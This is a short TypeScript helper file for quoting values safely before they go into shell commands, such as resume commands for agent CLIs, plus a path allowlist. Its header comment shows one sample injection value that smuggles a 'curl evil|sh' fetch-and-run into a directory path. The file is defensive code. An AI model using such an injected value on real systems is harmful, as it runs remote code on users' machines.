// Shared shell-quoting helper.
//
// Several code paths build a shell command as a STRING and feed it to a shell —
// most importantly the agent resume commands typed into a terminal via
// term.sendText (cd into a recorded cwd, then `claude/codex/grok --resume …`).
// Those interpolate values that are not fully under our control: a transcript's
// recorded `cwd` is any absolute directory path, and captured launch-flag values
// are arbitrary strings. A directory or flag value containing command-
// substitution syntax — `/x/$(curl evil|sh)`, a backtick variant, `$VAR` — would
// otherwise be expanded by the shell when the user clicks Restart/Resume.
//
// Single-quoting neutralizes ALL POSIX shell metacharacters ($, backtick,
// backslash, whitespace, globs): inside '…' nothing is special. The only value
// that needs handling is the single quote itself — we close the quote, emit an
// escaped literal quote, and reopen: foo'bar → 'foo'\''bar'.

/**
 * Wrap a value in POSIX single quotes so it is passed to the shell verbatim,
 * with no expansion. Safe for cw/paths, session ids, and flag values embedded in
 * a command string that a shell will parse.
 */
export function posixQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * A conservative allowlist for an absolute filesystem path we are about to
 * interpolate into a shell command. Rejects paths carrying shell command-
 * substitution / expansion characters even when quoting would already contain
 * them — defense in depth for the resume-command cwd. Returns true when the path
 * is a plain absolute path safe to use.
 */
export function isSafeAbsPath(p: string): boolean {
  if (!p || !p.startsWith('/')) return false;
  // No NUL, newlines, or command-substitution / backtick characters.
  return !/[\0\n\r`$]/.test(p);
}
